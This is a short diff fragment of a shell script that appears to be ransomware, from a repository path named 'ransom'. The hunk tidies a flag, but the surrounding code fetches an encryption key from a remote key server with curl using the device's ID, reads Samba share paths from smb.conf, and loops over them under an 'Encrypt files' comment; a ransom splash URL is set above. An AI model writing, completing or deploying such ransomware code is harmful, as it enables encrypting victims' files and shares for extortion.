@@ -10,12 +10,11 @@ splashLocation="https://raw.githubusercontent.com/absane/Tricks/master/ransom/ra
 targetFolder="/share"
 
 # Samba folders only. Set to False to target only $targetFolder
-smb=True
+smb="True"
 
-#	Encrypt files
+# Encrypt files
 . /tmp/dynamicconfig.ini
 KEY=$(curl ${keyServer}/key.php?mac=$DEVICEID -s)
-smb=True
 if [ $smb == "True" ]
 then
 	for targetFolder in $(cat /etc/samba/smb.conf | grep path | cut -d ' ' -f3-99);
